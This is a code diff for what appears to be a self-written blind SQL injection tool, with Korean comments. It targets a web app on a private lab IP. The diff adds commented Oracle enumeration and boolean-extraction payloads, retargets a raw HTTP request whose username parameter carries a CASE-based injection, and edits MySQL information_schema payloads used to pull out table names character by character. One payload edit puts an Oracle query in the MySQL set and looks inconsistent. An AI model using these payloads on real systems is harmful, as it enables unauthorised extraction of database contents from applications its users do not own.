@@ -4,8 +4,21 @@
 # 2. POST 문제 해결
 # 3. 다른 데이터베이스 페이로드 생성
 # 4. 데이터 출력 구현,  조회해서 나온 값을 (테이블 생성하고 각 컬럼들 값들을 SQLite에 그대로 저장)
+
+# DROP TABLE users1; # 삭제해야됨
+
+# SELECT username FROM users WHERE username like '%'||(CASE WHEN 1=1 THEN 'kazal92' ELSE 'test' END)||'%' # 조건식
+# (SELECT table_name FROM (SELECT rownum r, table_name FROM all_tables WHERE owner='C##KAZAL92')tb WHERE tb.r=1) # 페이로드 (테이블)
+
+# SELECT global_name FROM global_name;  # List Databases	# XE
+# SELECT DISTINCT owner FROM all_tables; # DB(USER)
+# SELECT table_name FROM all_tables WHERE owner='C##KAZAL92' # 테이블
+# SELECT * FROM all_tab_columns WHERE owner='C##KAZAL92' AND table_name='USERS'; #컬럼
 # 
-###############
+
+# SELECT username FROM users WHERE username like '%'||(CASE WHEN 1=1 THEN 'kazal92' ELSE 'test' END)||'%' # 조건식
+# ascii(SUBSTR((SELECT table_name FROM (SELECT rownum r, table_name FROM all_tables WHERE owner='C##KAZAL92')tb WHERE tb.r=1),1,1))=68 # 
+# (SELECT table_name FROM (SELECT rownum r, table_name FROM all_tables WHERE owner='C##KAZAL92')tb WHERE tb.r=1);###############
 
 # -*- coding: utf-8 -*-   
 from time import sleep
@@ -25,7 +38,7 @@ true_message_size = None # 참(ture)의 경우 message size
 
 REQUEST_STRING = """
 GET /?username='||(case+when+1=1+then+'kazal92'+else+'test'+end)||'&password=1234 HTTP/1.1
-Host: 192.168.219.100:5001
+Host: 192.168.0.32:5001
 Accept-Language: ko-KR,ko;q=0.9
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
@@ -224,7 +237,7 @@ def setpayload():
 			payloads = {
 				'Tables': {
 					'count' : "(SELECT count(*) FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}'))>{mid_val}",
-					'len' : "(SELECT length((SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') LIMIT {rows},1)))>{mid_val}",
+					'len' : "SELECT * FROM (SELECT rownum r, table_name FROM all_tables)tb WHERE tb.r=1;",
 					'tables' : "ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
 				}
 			}
